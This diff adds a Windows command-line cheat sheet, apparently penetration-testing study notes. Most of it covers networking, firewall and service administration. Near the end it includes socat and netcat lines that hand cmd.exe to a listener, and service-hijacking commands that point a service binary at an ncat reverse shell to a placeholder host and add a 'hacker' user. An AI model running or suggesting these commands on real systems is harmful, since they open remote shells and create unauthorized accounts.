@@ -1,0 +1,123 @@
+### network ##
+
+
+
+ipconfig /all
+ipconfig /release "Ethernet adapter Ethernet"					# tell dhcp to release ip
+ipconfig /renew "Ethernet adapter Ethernet"					# ask a new ip
+ipconfig /release								# apply to all adapter
+ipconfig /renew									# apply to all adapter
+ipconfig /displaydns								# display dns setting
+ipconfig /flushdns								# clear the dns cache
+
+
+systeminfo									# OS info and hardware
+systeminfo /s computer1 /u blue\domain1 /p password				# same but on remote computer
+
+
+set 										# get all env vars
+set PATH									# show PATH env var
+set U										# show env var starting with U
+set path=c:\Windows								# edit PATH env var
+setx PATH "c:\Windows" /M							# edit system-wide env var
+
+
+netstat -ano									# a:all and listen, o:proc id
+netstat -anob									# b:exec involved
+netstat -no -p tcp								# show only tcp
+arp -a										# all ARP entries
+
+
+route print									# show active routes
+route DELETE 1.1.1.1								# delete a route
+route ADD 192.168.1.0 MASK 255.255.255.0 192.168.1.1 METRIC 3 IF 2		# 2:interface
+tracert domain.com								# tracert
+tracert -d domain.com								# dont resolve domain
+pathping domain.com								# a bit more reliable
+pathping -n domain.com								# dont resolve domain
+
+
+type %SystemRoot%\System32\drivers\etc\hosts					# hosts file
+nbtstat /n									# netbios name table and cache
+nbtstat /c									# nbt cache
+nslookup domain.com								# find IP or domain
+nslookup x.x.x.x
+
+
+net share									# show find on current shares
+net share somename=C:\Windows\system32						# add a new share
+net use \\192.168.1.1\public							# mount a remote shared resource
+net use F: \\finance.outofthisworld.com\finance /user:finance			# map on F, connecter with user
+net use G: \\sub.domain.com\marketing /user:marketing /persistent:yes		# make persistent after reboot
+net use										# list mounted drive
+
+
+nc.exe -n -l -v -s 127.0.0.1 -p 1234						# listen on local interface
+nc.exe 127.0.0.1 1234								# connect to it from TARGET
+# listen
+socat.exe -d OPENSSL-LISTEN:5678,cert=offsec.pem, verify=0 STDOUT, bind=127.0.0.1  # d:debug, verify:skip cert verif
+socat.exe OPENSSL:127.0.0.1:5678, verify=0 EXEC=’cmd.exe’			# send a cmd.exe
+
+
+
+psexec -i \\myComputer cmd /c "systeminfo"					# exec cmd on remote device
+psexec -i \\myComputer -u username -p password cmd				# open a full interactive session
+psexec -i -s \\192.168.54.100 -u xxx -p xxx cmd					# use system account
+
+
+netsh firewall ?								# firewall deprecated
+netsh advfirewall ?								# has more capabilities
+netsh advfirewall reset								# reset firewall
+netsh advfirewall show allprofiles						# show profil guest/public/etc
+netsh advfirewall set domainprofile state on					# turn on a profil
+netsh advfirewall firewall show rule name=all					# list all rule
+get-netfirewallrule								# list all rule
+get-netfirewallrule -DisplayName "some name"					# get one rule
+netsh advfirewall firewall add rule ?						# help to add a rule
+netsh advfirewall firewall add rule name="noping" dir=in action=block		# in/out allow/block/bypass
+	protocol=icmpv4 remoteip=192.124.249.5					# block icmp from IP
+netsh advfirewall firewall delete rule name="noping"				# delete the rule
+netsh advfirewall firewall add rule name="blockos" dir=out action=block		# block all out traffic
+	remoteip=192.124.249.5 enable=yes					# to IP
+netsh advfirewall firewall add rule name="blockos" dir=out action=block		# block all out traffic
+	remoteip=192.124.249.5 enable=yes remoteport=443 protocol=tcp		# to IP+port+protocol
+netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow	# allow all in traffic
+	localport=22 protocol=tcp						# on port 22 with TCP
+netsh advfirewall export C:\firewallPolicy.wfw					# backup firewall rules
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes	# enable RDP
+
+
+sc start servicename								# start a service
+sc stop servicename								# stop a service
+tasklist /svc									# show services on process list
+sc query dhcp									# show info on a service
+sc qc dhcp									# more info on a service
+PsService.exe query WSearch							# quite same as sc
+PsService.exe config WSearch							# quite same as sc
+net stop WSearch
+net start WSearch								# view/start/stop/pause
+net help
+
+sc config WSearch start=auto							# startup type automatic
+sc config dhcp start=disabled							# disable service
+psservice config WSearch							# get some config of a service
+psservice setconfig WSearch auto						# startup type automatic
+sc config dhcp binPath= "ncat.exe x.x.x.x 4444 -e cmd.exe"			# config a rshell
+sc config test binPath= "net user hacker /add"					# add a new service
+net start test									# start it
+net user									# succesfully add a user
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
